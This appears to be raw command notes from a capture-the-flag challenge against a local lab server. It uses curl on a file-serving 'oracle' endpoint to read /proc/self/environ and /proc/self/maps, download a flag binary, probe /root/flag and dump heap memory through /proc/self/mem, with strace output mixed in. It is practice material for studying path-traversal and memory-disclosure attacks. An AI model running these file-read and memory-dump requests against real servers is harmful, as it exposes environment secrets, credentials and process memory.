curl -s --output - http://192.168.1.181:3030/oracle/proc/self/environ | strings

$ curl -s --output - http://192.168.1.181:3030/oracle/proc/self/environ | strings
SHELL=/bin/bash
...
PWD=/home/kali/ctf/tamuctf/bin
...
HOME=/home/kali
...
USER=kali
...
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/ctf/tamuctf/bin/flagpath
...
_=./delfi

curl -s --output - http://192.168.1.181:3030/oracle/home/kali/ctf/tamuctf/bin/flagpath/get_flag > get_flag

$ curl -s --output - http://192.168.1.181:3030/oracle/home/kali/ctf/tamuctf/bin/flagpath/get_flag > get_flag
$ file get_flag
get_flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1f82173a05fef9676e924cfe7cc3cc7584a084ee, with debug_info, not stripped

curl -s -o /dev/null --head -w "%{http_code}\n" http://192.168.1.181:3030/oracle/root/flag

kali@kali:/tmp$ strace ./get_flag 
execve("./get_flag", ["./get_flag"], 0x7ffca03990b0 /* 31 vars */) = 0
brk(NULL)                               = 0x558475c14000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
...
close(3)                                = 0
setuid(0)                               = -1 EPERM (Operation not permitted)
write(2, "thread '", 8thread ')                 = 8
...

curl -s --output - http://192.168.1.181:3030/oracle/proc/self/maps | strings'



curl -s --output - http://192.168.1.181:3030/oracle/proc/self/mem?offset=94761260638208\&size=135168 > server_heap.bin